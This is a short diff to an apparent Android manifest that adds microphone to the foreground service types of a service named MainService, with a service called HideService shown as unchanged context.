@@ -59,7 +59,7 @@
             android:name=".services.MainService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync|camera" />
+            android:foregroundServiceType="dataSync|camera|microphone" />
         <service
             android:name=".services.HideService"
             android:enabled="true"
